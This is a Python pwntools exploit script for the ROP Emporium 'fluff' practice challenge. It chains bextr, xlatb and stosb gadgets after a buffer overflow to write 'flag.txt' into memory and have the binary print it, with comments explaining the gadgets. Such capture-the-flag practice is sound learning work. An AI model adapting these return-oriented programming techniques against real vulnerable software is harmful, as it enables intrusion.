from pwn import *

target = process("./fluff")
#elf = ELF("fluff")
"""
0x0000000000400639 : stosb byte ptr [rdi], al ; ret
0x00000000004006a3 : pop rdi ; ret
0x000000000040062a: pop rdx; pop rcx; add rcx, 0x3ef2; bextr rbx, rcx, rdx; ret; 
------------------------------------------------------------------------------------------------------------------
const uint8_t table[256] = { ...some byte constants (table data) ... };
const uint8_t* ds_bx = table;
uint8_t al = <some value to translate>;
al = ds_bx[al]; // al = table[al];
// like "mov al,[ds:bx + al]" in ASM

XLAT m8	Set AL to memory byte DS:[(E)BX + unsigned AL].
------------------------------------------------------------------------------------------------------------------
0x0000000000400628: xlatb; ret;
0x0000000000400610: mov eax, 0; pop rbp; ret;

do: (bottom to top)
stosb [rdi], al
pop rdi
xlat
bextr
"""
def bextr(start, length, source):
	#rdx --> control
	#rcx --> source (constant, not an address)
	#rbx --> dest
    """
	START <-- SRC2[7:0];
	LEN <-- SRC2[15:8];
	TEMP <-- ZERO_EXTEND_TO_512 (SRC1 );
	DEST <-- ZERO_EXTEND(TEMP[START+LEN -1: START]);
	ZF <-- (DEST = 0);
    """
    rdx = 0
    rdx = (rdx | start) | (length << 8) 
    gadget = 0x40062a
    print(hex(source))
    if source < 0x3ef2:
        source = ((source - 0x3ef2) % (1<<64))
    else:
        source -= 0x3ef2
    return p64(gadget) + p64(rdx) + p64(source)


def xlat():
    #return p64(0x400610) + p64(0xdeadbeef) + p64(0x400628)
    return p64(0x400628)


def stosb():
    return p64(0x400639)


def store(dest, data):
    payload = ""
    storage = {'a': 982, 'b': 571, 'c': 1020, 'd': 403, 'e': 662, 'f': 964, 'g': 975, 'h': 864, 'i': 570, 'k': 650, 'l': 569, 'm': 976, 'n': 580, 'o': 592, 'p': 988, 'q': 709, 'r': 983, 's': 591, 't': 402, 'u': 581, 'w': 1000, 'x': 582,".":0x251, 'y': 660, 'z': 649}

    bebe = 0xb
    bits = bextr(0, 23, 0x400000 + storage[data[0]] - 0xb)
    bebe = ord(data[0])
    al = xlat()
    poprdi = p64(0x00000000004006a3) + p64(dest)
    payload += bits + al + poprdi + stosb()
    for i, b in enumerate(data[1:]):
        bits = bextr(0, 23, 0x400000 + storage[b] - bebe)
        bebe = ord(b)
        al = xlat()
        payload += bits + al + stosb()

    return payload



payload = "a" * 0x28 + store(0x601030, "flag.txt") + p64(0x4006a3) + p64(0x601030) + p64(0x400510)
print(len(payload))
import time
import sys
time.sleep(int(sys.argv[1]))
target.sendline(payload)
target.interactive()


